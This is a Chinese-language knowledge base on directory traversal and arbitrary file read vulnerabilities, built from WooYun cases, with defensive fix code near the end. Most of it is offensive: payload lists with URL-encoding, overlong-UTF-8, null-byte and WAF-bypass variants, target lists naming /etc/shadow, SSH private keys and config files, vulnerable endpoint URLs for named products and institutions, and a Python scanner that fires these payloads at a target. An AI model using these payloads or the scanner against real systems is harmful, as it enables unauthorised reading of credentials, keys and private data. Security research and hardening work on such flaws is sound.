# 文件遍历/任意文件读取漏洞分析知识库

> 基于WooYun漏洞库50个真实案例提炼的元知识
> 生成时间: 2026-01-23
> 数据来源: wooyun_vulnerabilities.json

---

## 一、漏洞参数命名模式

### 1.1 高频漏洞参数 (按出现频率排序)

| 参数名 | 出现次数 | 典型场景 |
|--------|----------|----------|
| filename | 63 | 文件下载、附件获取 |
| filepath | 30 | 文件路径指定 |
| path | 20 | 通用路径参数 |
| hdfile | 14 | 特定CMS下载参数 |
| inputFile | 9 | Resin/Java服务 |
| file | 7 | 通用文件参数 |
| url | 4 | SSRF/文件读取复合 |
| filePath | 4 | Java驼峰命名 |
| FileUrl | 3 | ASP.NET常见 |
| XFileName | 3 | 特定CMS参数 |

### 1.2 参数命名规律

```
通用类:   file, path, name, url, src, dir, folder
下载类:   download, down, attachment, attach, doc
读取类:   read, load, get, fetch, open, input
文件类:   filename, filepath, fname, fn, resource
模板类:   template, tpl, page, include, temp
```

### 1.3 复合参数组合

```
# 常见双参数组合
?path=xxx&name=xxx
?filePath=xxx&fileName=xxx
?FileUrl=xxx&FileName=xxx
?file=xxx&showname=xxx
?inputFile=xxx&type=xxx
```

---

## 二、目录遍历Payload大全

### 2.1 基础遍历序列

```bash
# 标准Linux路径
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../

# 标准Windows路径
..\
..\..\
..\..\..\
```

### 2.2 编码绕过技术

#### URL单次编码

```
../     -> %2e%2e%2f
..\     -> %2e%2e%5c
/       -> %2f
\       -> %5c
.       -> %2e
```

#### URL双重编码

```
../     -> %252e%252e%252f
..\     -> %252e%252e%255c
%2f     -> %252f
```

#### Unicode/UTF-8超长编码 (GlassFish特有)

```
..      -> %c0%ae%c0%ae
/       -> %c0%af
\       -> %c1%9c

# 完整payload示例 (上海海事大学案例)
/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

#### 混合编码

```
..%2f
%2e%2e/
%2e%2e%5c
..%252f
..%c0%af
```

### 2.3 特殊绕过技术

#### 空字节截断 (%00)

```bash
# PHP < 5.3.4 / Java旧版本
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# 某电商平台案例
/misc/script/?js=../../../../../etc/passwd%00f.js
```

#### Base64编码绕过

```bash
# Winmail Server案例
# ../../../windows/win.ini -> Base64
viewsharenetdisk.php?userid=postmaster&opt=view&filename=Li4vLi4vLi4vLi4vLi4vLi4vd2luZG93cy93aW4uaW5p

# 淘客帝国CMS案例
pic.php?url=cGljLnBocA==  # pic.php的Base64
```

#### 路径正则化绕过

```bash
# 点号绕过
..../
....//
....\/

# 混合斜杠
..\/
../\

# 冗余路径
/./
//
```

---

## 三、敏感文件读取目标

### 3.1 Linux系统敏感文件

```bash
# 系统账户 (出现频率最高)
/etc/passwd              # 用户列表 (9次)
/etc/shadow              # 密码哈希 (2次)
/etc/hosts               # 主机映射 (2次)
/etc/group               # 用户组
/etc/sudoers             # sudo配置

# SSH相关
/root/.ssh/authorized_keys
/root/.ssh/id_rsa
/home/[user]/.ssh/authorized_keys
/home/[user]/.ssh/id_rsa

# 历史记录 (信息金矿)
/root/.bash_history
/home/[user]/.bash_history
/home/www/.bash_history   # Web用户

# 进程信息
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/[n]
/proc/version

# 配置文件
/etc/nginx/nginx.conf
/etc/httpd/conf/httpd.conf
/etc/apache2/apache2.conf
/etc/my.cnf
/etc/mysql/my.cnf
```

### 3.2 Windows系统敏感文件

```bash
# 系统文件 (4次出现)
C:\windows\win.ini
C:\boot.ini
C:\windows\system32\config\sam
C:\windows\repair\sam

# IIS配置
C:\inetpub\wwwroot\web.config
C:\windows\system32\inetsrv\config\applicationHost.config
```

### 3.3 Java Web敏感文件

```bash
# 核心配置 (6次出现)
WEB-INF/web.xml
WEB-INF/classes/
WEB-INF/lib/

# 数据库配置
WEB-INF/classes/jdbc.properties
WEB-INF/classes/database.properties
WEB-INF/classes/hibernate.cfg.xml
WEB-INF/classes/applicationContext.xml

# 常见payload
/../WEB-INF/web.xml
/../WEB-INF/web.xml%3f
../../../WEB-INF/web.xml
```

### 3.4 PHP应用敏感文件

```bash
# 配置文件 (多次出现)
config.php
config.inc.php
db.php
database.php
conn.php
connection.php
common.php
global.php
settings.php
configuration.php

# 框架配置
config/database.php          # Laravel
application/config/database.php  # CodeIgniter
wp-config.php                # WordPress
config_global.php            # Discuz
config_ucenter.php           # Discuz UCente
```

### 3.5 ASP.NET敏感文件

```bash
# 核心配置 (4次出现)
web.config
../web.config
../../web.config

# 连接字符串示例
<connectionStrings>
  <add name="xxx" connectionString="Data Source=xxx;Initial Catalog=xxx;User ID=xxx;Password=xxx"/>
</connectionStrings>
```

---

## 四、高频漏洞功能点

### 4.1 按功能分类统计

| 功能类型 | 出现次数 | 典型接口 |
|----------|----------|----------|
| 文件下载 | 27 | down.php, download.jsp |
| 文件读取 | 17 | read.php, get.php |
| 附件管理 | 6 | attachment.php |
| 图片处理 | 5 | image.php, pic.php |
| 文件上传 | 5 | upload.php |
| 日志查看 | 4 | log.php, viewlog.jsp |
| 模板渲染 | 2 | template.php |
| 备份功能 | 2 | backup.php |

### 4.2 漏洞端点TOP 20

```
down.php           (20次)
download.jsp       (17次)
download.asp       (13次)
download.php       (7次)
download.ashx      (7次)
viewsharenetdisk.php (6次)
GetPage.ashx       (6次)
pic.php            (4次)
openfile.asp       (4次)
do_download.jsp    (8次)
```

### 4.3 典型漏洞URL模式

```bash
# PHP
/down.php?filename=../../../etc/passwd
/download.php?file=../config.php
/pic.php?url=[base64编码路径]

# JSP
/download.jsp?path=../WEB-INF/web.xml
/do_download.jsp?filePath=../../etc/passwd
/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# ASP/ASPX
/DownLoad.aspx?Accessory=../web.config
/DownFile/OpenFile.aspx?XFileName=../web.config
/download.ashx?file=../../../web.config

# Resin特有
/resin-doc/resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd
```

---

## 五、漏洞代码模式分析

### 5.1 PHP漏洞代码特征

```php
// 典型漏洞代码 (某安防厂商案例)
<?php
$file_name = $_GET['fileName'];
$file_dir = "../../../log/";
$handler = fopen($file_dir . $file_name, 'r');
// 直接拼接,无过滤

// 淘客帝国CMS Base64漏洞
$url = url_base64_decode($_GET["url"]);
echo file_get_contents($url);  // 解码后直接读取

// 悟空CRM漏洞
$path = trim(urldecode($_GET['path']));
$name = substr(trim(urldecode($_GET['name'])), 0, -4);
download($path, $name);  // 未过滤直接下载
```

### 5.2 Java漏洞代码特征

```java
// 金智教育epstar系统
String fileName = request.getParameter("fileName");
// 直接使用参数,未验证
InputStream is = new FileInputStream(basePath + fileName);

// 文件下载Servlet
String filePath = request.getParameter("filePath");
File file = new File(filePath);  // 绝对路径直接使用
```

### 5.3 ASP.NET漏洞代码特征

```csharp
// Data地方门户系统
string requestUriString = Tool.CStr(context.Request["url"]);
WebRequest request = WebRequest.Create(requestUriString);
// file://协议未过滤,导致任意文件读取
```

---

## 六、绕过过滤技巧总结

### 6.1 绕过技术统计

| 技术类型 | 案例数 | 有效性 |
|----------|--------|--------|
| 绝对路径直接访问 | 16 | 高 |
| WEB-INF目录访问 | 6 | 高 |
| Base64编码 | 3 | 中 |
| 空字节截断 | 3 | 中(旧版本) |
| file://协议 | 2 | 高 |
| URL单次编码 | 1 | 中 |
| UTF-8超长编码 | 1 | 高(特定服务) |

### 6.2 绕过场景与方法

#### 场景1: 过滤../

```bash
# 方法1: URL编码
%2e%2e%2f
%2e%2e/
..%2f

# 方法2: 双重编码
%252e%252e%252f

# 方法3: Unicode
%c0%ae%c0%ae/

# 方法4: 混合写法
....//
..../
..\../
```

#### 场景2: 文件后缀白名单

```bash
# 方法1: 空字节截断 (PHP < 5.3.4)
../../../etc/passwd%00.jpg
../../../etc/passwd%00.png

# 方法2: 问号截断
../../../WEB-INF/web.xml%3f

# 方法3: #号截断
../../../etc/passwd#.jpg
```

#### 场景3: 路径白名单

```bash
# 方法: 目录跳转后返回
/allowed/path/../../../etc/passwd
/images/../../../etc/passwd
```

#### 场景4: 协议限制

```bash
# file://协议读取
file:///etc/passwd
file://localhost/etc/passwd
file:///C:/windows/win.ini
```

---

## 七、通用型漏洞案例库

### 7.1 高校通用系统

```bash
# 金智教育epstar系统 (影响: 复旦、南开等名校)
/epstar/servlet/RaqFileServer?action=open&fileName=/../WEB-INF/web.xml

# 天空教室精品软件
/sc8/coursefiledownload?courseId=272&filepath=../../../../../../etc/shadow&filetype=2

# 某教育类通用CMS
/DownLoad.aspx?Accessory=../web.config
```

### 7.2 政府通用系统

```bash
# 多个政府网站通用漏洞
/download.jsp?path=../WEB-INF/web.xml
/do_download.jsp?path=/do_download.jsp
/DownFile/OpenFile.aspx?XFileName=../web.config
/load.jsp?path=../WEB-INF&file=web.xml
```

### 7.3 企业通用产品

```bash
# 某安防厂商视频接入网关
/serverLog/downFile.php?fileName=../../../etc/passwd

# Winmail Server 6.0
/viewsharenetdisk.php?userid=postmaster&opt=view&filename=[base64]

# 某安全厂商TopScanner
/task/saveTaskIpList.php?fileName=/etc/passwd

# 悟空CRM
/index.php?m=File&a=filedownload&path=../../../etc/passwd
```

---

## 八、漏洞挖掘检测清单

### 8.1 参数Fuzzing列表

```bash
# 基础测试
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd

# Windows测试
..\windows\win.ini
..\..\windows\win.ini
..\..\..\windows\win.ini

# Java Web测试
../WEB-INF/web.xml
../../WEB-INF/web.xml
/../WEB-INF/web.xml

# 编码测试
%2e%2e%2fetc/passwd
..%2fetc/passwd
%2e%2e/etc/passwd
..%252fetc/passwd
%c0%ae%c0%ae/etc/passwd

# 截断测试
../../../etc/passwd%00
../../../etc/passwd%00.jpg
../../../etc/passwd%23
../../../etc/passwd%3f
```

### 8.2 功能点审计清单

- [ ] 文件下载功能
- [ ] 附件预览功能
- [ ] 图片加载功能
- [ ] 模板渲染功能
- [ ] 日志查看功能
- [ ] 备份下载功能
- [ ] 文件导出功能
- [ ] 资源加载功能
- [ ] 报表生成功能
- [ ] 静态资源服务

### 8.3 漏洞验证文件

```bash
# Linux验证
/etc/passwd       # 必有文件
/etc/hosts        # 必有文件
/proc/version     # 内核版本

# Windows验证
C:\windows\win.ini
C:\boot.ini       # XP/2003
C:\windows\system.ini

# Java验证
WEB-INF/web.xml   # 必有文件

# 应用配置验证
web.config        # ASP.NET
config.php        # PHP
```

---

## 九、防御加固建议

### 9.1 输入验证

```python
# 路径规范化 + 白名单验证
import os

def safe_file_access(user_input, base_dir):
    # 1. 规范化路径
    full_path = os.path.normpath(os.path.join(base_dir, user_input))

    # 2. 验证是否在允许目录内
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")

    # 3. 验证文件存在且可读
    if not os.path.isfile(full_path):
        raise FileNotFoundError()

    return full_path
```

### 9.2 关键防御措施

1. **路径规范化**: 使用`realpath()`/`normpath()`处理输入
2. **目录限制**: 验证最终路径在允许的基础目录内
3. **白名单验证**: 限制允许访问的文件类型和目录
4. **权限最小化**: Web服务以低权限用户运行
5. **敏感文件保护**: 将配置文件移出Web目录

---

## 十、参考案例索引

| 漏洞ID | 厂商 | 关键技术 |
|--------|------|----------|
| wooyun-2015-092186 | 某社交平台某社交平台 | curl直接读取 |
| wooyun-2016-0189746 | Winmail | Base64编码 |
| wooyun-2016-0214222 | 某电商平台 | 空字节截断 |
| wooyun-2016-0170101 | 上海海事大学 | UTF-8超长编码 |
| wooyun-2015-0130898 | 金智教育 | WEB-INF读取 |
| wooyun-2015-0116637 | 淘客帝国 | Base64+file_get_contents |
| wooyun-2015-0175625 | 某安防厂商 | PHP直接读取 |
| wooyun-2014-087735 | Data门户 | file://协议 |

---

## 十一、元思考方法论

### 11.1 漏洞存在的根本原因

**INTJ洞察**: 目录遍历漏洞本质是"信任边界"的模糊性

```
用户输入空间
    ↓
[信任边界] ← 失效点
    ↓
文件系统空间
```

**核心问题链**:
1. **开发者的心智模型漏洞**: "用户输入 = 文件名" 而非 "用户输入 = 路径指令"
2. **字符串拼接的语义鸿沟**: 开发者看到的是 `base + filename`,攻击者看到的是 `path_traversal + target`
3. **路径解析的层次不一致**: 应用层解析 vs 操作系统解析的差异空间

**典型代码反模式**:
```php
# 开发者意图: 读取用户指定的日志文件
$file = $_GET['file'];
$path = '/var/www/logs/' . $file;

# 攻击者视角: 路径构造器
# ?file=../../../../../etc/passwd
# 结果: /var/www/logs/../../../../../etc/passwd
#      ↓ realpath处理后
#      /etc/passwd
```

### 11.2 漏洞发现的多维策略

#### 维度1: 参数语义推断 (80/20法则)

**高价值参数语义特征**:
```
文件下载类: download, down, get, fetch, read, open, view, load
附件类: attachment, attach, file, doc, resource
路径类: path, dir, folder, uri, url, src
配置类: config, setting, template, include, require
```

**发现流程**:
```
1. 抓包/爬虫 → 提取所有参数名
2. 语义匹配 → 识别可疑参数
3. 上下文分析 → 确认功能类型
4. 构造测试payload → 验证漏洞
```

#### 维度2: 功能点定向爆破 (高频漏洞点)

**TOP 10 高危功能** (基于WooYun数据):
1. **文件下载接口** (27次) - down.php, download.jsp
2. **文件预览功能** (17次) - view.php, preview.jsp
3. **图片加载器** (5次) - pic.php, image.jsp
4. **日志查看器** (4次) - log.php, viewlog.jsp
5. **备份下载** (2次) - backup.php, dump.jsp
6. **模板渲染** (2次) - template.php, tpl.jsp
7. **附件管理** (6次) - attachment.php
8. **导出功能** (3次) - export.php, download_excel.jsp
9. **资源加载** (4次) - resource.php, static.jsp
10. **上传预览** (5次) - upload.php, preview_upload.jsp

#### 维度3: 技术栈特征识别

**PHP应用特征**:
```bash
# 关键文件存在
index.php, config.php, common.php
# 测试payload
download.php?file=../../../../../etc/passwd
pic.php?url=config.php  # Base64编码测试
```

**Java Web特征**:
```bash
# 关键目录存在
WEB-INF/, META-INF/, classes/, lib/
# 测试payload
download.jsp?path=../WEB-INF/web.xml
servlet/file?fileName=/../WEB-INF/web.xml
```

**ASP.NET特征**:
```bash
# 关键文件存在
web.config, bin/, App_Code/
# 测试payload
download.ashx?file=../../../web.config
DownLoad.aspx?Accessory=../web.config
```

### 11.3 测试Payload优先级矩阵

| 威胁等级 | 响应确定性 | 测试成本 | 优先级 |
|---------|-----------|---------|--------|
| 高 | 高 | 低 | **P0** (立即测试) |
| 高 | 中 | 低 | **P1** (优先测试) |
| 中 | 高 | 低 | **P2** (常规测试) |
| 中 | 中 | 中 | **P3** (可选测试) |
| 低 | 低 | 高 | **P4** (最后测试) |

**P0级测试集** (必测):
```bash
# Linux基础遍历
../../../../../etc/passwd
..\..\..\..\..\..\etc/passwd

# Windows基础遍历
..\..\..\..\..\..\windows\win.ini

# Java Web基础遍历
../WEB-INF/web.xml
../../WEB-INF/web.xml
```

---

## 十二、华云数据案例分析 (wooyun-2015-0124527)

### 12.1 漏洞基本信息

```json
{
  "bug_id": "wooyun-2015-0124527",
  "title": "华云数据某站存在任意文件读取漏洞",
  "vuln_type": "漏洞类型:任意文件遍历/下载",
  "level": "危害等级:高",
  "detail": "download.php?file=../../../../../etc/passwd",
  "poc": "file参数存在目录遍历,可以读取系统任意文件"
}
```

### 12.2 漏洞技术分析

#### 攻击面特征

**1. 参数特征分析**
```
参数名: file
语义: 通用文件参数
风险等级: 高 (7/10)
```

**2. 功能推断**
```
端点: download.php
功能: 文件下载
预期逻辑: 读取指定文件并输出
攻击面: 可能存在路径遍历
```

**3. Payload构造逻辑**
```bash
# 基础遍历深度探测
../
../../
../../../
../../../../
../../../../../
../../../../../../
../../../../../../../

# 目标文件定位
/etc/passwd  # Linux验证文件
C:\windows\win.ini  # Windows验证文件
```

#### 漏洞代码还原 (推测)

```php
<?php
// download.php (漏洞代码推测)
$file = $_GET['file'];  // 直接获取参数,无过滤
$filepath = '/var/www/uploads/' . $file;  // 字符串拼接

header('Content-Description: File Transfer');
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename=' . basename($file));
readfile($filepath);  // 直接读取文件

// 攻击payload:
// download.php?file=../../../../../etc/passwd
// 实际读取: /var/www/uploads/../../../../../etc/passwd
//         = /etc/passwd (路径解析后)
?>
```

### 12.3 影响面评估

**INTJ洞察**: 从单点漏洞到系统影响的因果链

```
任意文件读取
    ↓
[系统敏感文件泄露]
    ↓
├─ /etc/passwd → 用户枚举
├─ /etc/shadow → 密码哈希泄露
├─ ~/.ssh/id_rsa → 私钥泄露 → 直接SSH登录
├─ ~/.bash_history → 操作记录 → 内网信息
├─ /var/www/config.php → 数据库凭证
├─ WEB-INF/web.xml → 应用逻辑
└─ 日志文件 → 用户数据、会话token
    ↓
[服务器完全沦陷]
```

**实际危害等级**:
- **信息泄露**: 高 (系统架构、凭证、用户数据)
- **权限提升**: 高 (私钥泄露 → root权限)
- **横向移动**: 高 (历史记录 → 内网拓扑)
- **数据泄露**: 高 (数据库凭证 → 敏感数据)

### 12.4 完整测试Payload集合

#### Linux系统目标文件

```bash
# 基础系统文件
download.php?file=../../../../../etc/passwd
download.php?file=../../../../../etc/shadow
download.php?file=../../../../../etc/hosts
download.php?file=../../../../../etc/group
download.php?file=../../../../../etc/sudoers

# SSH密钥文件
download.php?file=../../../../../root/.ssh/id_rsa
download.php?file=../../../../../root/.ssh/authorized_keys
download.php?file=../../../../../home/*/.ssh/id_rsa
download.php?file=../../../../../home/*/.ssh/authorized_keys

# 历史命令
download.php?file=../../../../../root/.bash_history
download.php?file=../../../../../home/*/.bash_history

# Web应用配置
download.php?file=../../../../../var/www/html/config.php
download.php?file=../../../../../var/www/html/config.inc.php
download.php?file=../../../../../var/www/html/db.php
download.php?file=../../../../../var/www/html/.htaccess

# 日志文件
download.php?file=../../../../../var/log/apache2/access.log
download.php?file=../../../../../var/log/apache2/error.log
download.php?file=../../../../../var/log/nginx/access.log
download.php?file=../../../../../var/log/nginx/error.log

# 进程信息
download.php?file=../../../../../proc/self/environ
download.php?file=../../../../../proc/self/cmdline
```

#### Windows系统目标文件

```bash
# 系统配置
download.php?file=..\..\..\..\..\..\windows\win.ini
download.php?file=..\..\..\..\..\..\boot.ini
download.php?file=..\..\..\..\..\..\windows\system.ini

# IIS配置
download.php?file=..\..\..\..\..\..\inetpub\wwwroot\web.config
download.php?file=..\..\..\..\..\..\windows\system32\inetsrv\config\applicationHost.config

# 数据库文件
download.php?file=..\..\..\..\..\..\program files\mysql\my.ini
download.php?file=..\..\..\..\..\..\program files\mysql\data\mysql\user.MYD
```

#### Java Web应用目标

```bash
# 核心配置
download.php?file=../../WEB-INF/web.xml
download.php?file=../../WEB-INF/classes/jdbc.properties
download.php?file=../../WEB-INF/classes/database.properties
download.php?file=../../WEB-INF/classes/applicationContext.xml

# 类文件
download.php?file=../../WEB-INF/classes/
download.php?file=../../WEB-INF/lib/
```

### 12.5 绕过WAF/过滤技巧

#### 技巧1: URL编码绕过

```bash
# 单次编码
download.php?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 双重编码
download.php?file=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd

# 混合编码
download.php?file=..%2f..%2f..%2fetc/passwd
download.php?file=%2e%2e/%2e%2e/%2e%2e/etc/passwd
download.php?file=..%252f..%252fetc/passwd
```

#### 技巧2: Unicode/UTF-8编码

```bash
# 超长UTF-8编码 (GlassFish/JBoss等)
download.php?file=%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd

# Unicode编码
download.php?file=\u002e\u002e/\u002e\u002e/\u002e\u002e/etc/passwd
```

#### 技巧3: 路径混淆

```bash
# 多余斜杠
download.php?file=....//....//....//etc/passwd
download.php?file=..\/..\/..\/etc/passwd
download.php?file=../\../\../\etc/passwd

# 冗余路径
download.php?file=./../../etc/passwd
download.php?file=.././../etc/passwd
download.php?file=../%2e%2e/../etc/passwd
```

#### 技巧4: 空字节截断 (PHP < 5.3.4)

```bash
# 绕过文件后缀检查
download.php?file=../../../../../etc/passwd%00
download.php?file=../../../../../etc/passwd%00.jpg
download.php?file=../../../../../etc/passwd%00.png
```

#### 技巧5: 绝对路径跳转

```bash
# 如果相对路径被过滤
download.php?file=/etc/passwd
download.php?file=C:\windows\win.ini

# 协议绕过
download.php?file=file:///etc/passwd
download.php?file=file://localhost/etc/passwd
```

### 12.6 自动化检测脚本

```python
#!/usr/bin/env python3
# 华云数据风格任意文件读取漏洞检测器

import requests
from urllib.parse import quote

class FileTraversalScanner:
    def __init__(self, base_url, parameter='file'):
        self.base_url = base_url
        self.parameter = parameter
        self.results = []

    # P0级测试集
    def test_p0_payloads(self):
        payloads = [
            # Linux基础遍历
            '../../../../../etc/passwd',
            '..\\..\\..\\..\\..\\..\\etc/passwd',

            # Windows基础遍历
            '..\\..\\..\\..\\..\\..\\windows\\win.ini',

            # Java Web遍历
            '../WEB-INF/web.xml',
            '../../WEB-INF/web.xml',
        ]

        return self._test_payloads(payloads)

    # 编码绕过测试
    def test_encoding_bypass(self):
        payloads = [
            # URL单次编码
            quote('../../../../../etc/passwd', safe=''),
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            '..%2f..%2f..%2fetc/passwd',

            # 双重编码
            '%252e%252e%252f%252e%252e%252fetc/passwd',

            # Unicode编码
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',

            # 空字节截断
            '../../../../../etc/passwd%00',
            '../../../../../etc/passwd%00.jpg',
        ]

        return self._test_payloads(payloads)

    # 敏感文件检测
    def test_sensitive_files(self):
        files = [
            '/etc/passwd',
            '/etc/shadow',
            '/root/.ssh/id_rsa',
            '/root/.bash_history',
            '/var/www/html/config.php',
            '/WEB-INF/web.xml',
            'C:\\windows\\win.ini',
            'C:\\inetpub\\wwwroot\\web.config',
        ]

        payloads = [f'../../../../../..{f}' for f in files]
        return self._test_payloads(payloads)

    def _test_payloads(self, payloads):
        results = []
        for payload in payloads:
            url = f'{self.base_url}?{self.parameter}={payload}'
            try:
                response = requests.get(url, timeout=5)
                if self._is_vulnerable(response):
                    results.append({
                        'payload': payload,
                        'url': url,
                        'status': response.status_code,
                        'evidence': self._extract_evidence(response)
                    })
            except Exception as e:
                continue
        return results

    def _is_vulnerable(self, response):
        # 检测Linux passwd文件
        if 'root:' in response.text and '/bin/bash' in response.text:
            return True
        # 检测Windows win.ini
        if '[extensions]' in response.text or '[fonts]' in response.text:
            return True
        # 检测Java web.xml
        if '<web-app' in response.text and 'servlet' in response.text:
            return True
        return False

    def _extract_evidence(self, response):
        lines = response.text.split('\n')[:3]
        return '\n'.join(lines)

# 使用示例
if __name__ == '__main__':
    scanner = FileTraversalScanner('https://example.com/[已脱敏]')
    print('[*] Testing P0 payloads...')
    results = scanner.test_p0_payloads()
    for r in results:
        print(f'[+] Vulnerable: {r["url"]}')
        print(f'    Evidence:\n{r["evidence"]}\n')
```

### 12.7 修复方案

#### 错误示例 (仍在漏洞中)

```php
// ❌ 错误: 部分过滤,可绕过
$file = str_replace('../', '', $_GET['file']);
// 绕过: ....// 或 ..\ 或 %2e%2e%2f

// ❌ 错误: 只检查开头
if (strpos($file, '../') === 0) { die(); }
// 绕过: ./../ 或 %2e%2e/

// ❌ 错误: 正则不完整
if (preg_match('/\.\.\//', $file)) { die(); }
// 绕过: ..\ 或 %2e%2e%2f
```

#### 正确修复方案

```php
// ✓ 正确: 路径规范化 + 白名单验证
<?php
function safe_download($user_input, $base_dir = '/var/www/uploads/') {
    // 1. 路径规范化 (解析所有../和符号链接)
    $full_path = realpath($base_dir . $user_input);

    // 2. 验证路径在允许目录内
    if ($full_path === false || strpos($full_path, $base_dir) !== 0) {
        http_response_code(403);
        die('Access denied');
    }

    // 3. 验证文件存在
    if (!file_exists($full_path)) {
        http_response_code(404);
        die('File not found');
    }

    // 4. 验证文件类型 (可选白名单)
    $allowed_exts = ['jpg', 'png', 'pdf', 'doc', 'docx'];
    $ext = strtolower(pathinfo($full_path, PATHINFO_EXTENSION));
    if (!in_array($ext, $allowed_exts)) {
        http_response_code(403);
        die('File type not allowed');
    }

    // 5. 安全下载
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename=' . basename($full_path));
    readfile($full_path);
}

// 使用
safe_download($_GET['file']);
?>
```

```java
// ✓ Java版本修复
import java.io.File;
import java.nio.file.Path;
import java.nio.file.Paths;

public class SecureDownload {
    private static final String BASE_DIR = "/var/www/uploads/";

    public static void safeDownload(String userInput) throws Exception {
        // 1. 规范化路径
        Path basePath = Paths.get(BASE_DIR).toAbsolutePath().normalize();
        Path fullPath = basePath.resolve(userInput).toAbsolutePath().normalize();

        // 2. 验证在基础目录内
        if (!fullPath.startsWith(basePath)) {
            throw new SecurityException("Path traversal detected");
        }

        // 3. 验证文件存在且可读
        File file = fullPath.toFile();
        if (!file.exists() || !file.isFile() || !file.canRead()) {
            throw new FileNotFoundException("File not accessible");
        }

        // 4. 下载文件
        // ... 下载逻辑
    }
}
```

```csharp
// ✓ ASP.NET版本修复
using System;
using System.IO;
using System.Linq;

public class SecureDownloadHandler : IHttpHandler {
    private const string BaseDir = @"C:\inetpub\wwwroot\uploads\";

    public void ProcessRequest(HttpContext context) {
        string userInput = context.Request["file"];

        // 1. 路径规范化
        string basePath = Path.GetFullPath(BaseDir);
        string fullPath = Path.GetFullPath(Path.Combine(BaseDir, userInput));

        // 2. 验证在基础目录内
        if (!fullPath.StartsWith(basePath, StringComparison.OrdinalIgnoreCase)) {
            throw new SecurityException("Path traversal detected");
        }

        // 3. 验证文件存在
        if (!File.Exists(fullPath)) {
            context.Response.StatusCode = 404;
            return;
        }

        // 4. 白名单文件类型
        string ext = Path.GetExtension(fullPath).ToLower();
        string[] allowedExts = { ".jpg", ".png", ".pdf" };
        if (!allowedExts.Contains(ext)) {
            context.Response.StatusCode = 403;
            return;
        }

        // 5. 安全下载
        context.Response.ContentType = "application/octet-stream";
        context.Response.TransmitFile(fullPath);
    }
}
```

---

*本文档基于WooYun漏洞库真实案例分析生成，仅供安全研究和防御参考使用。*
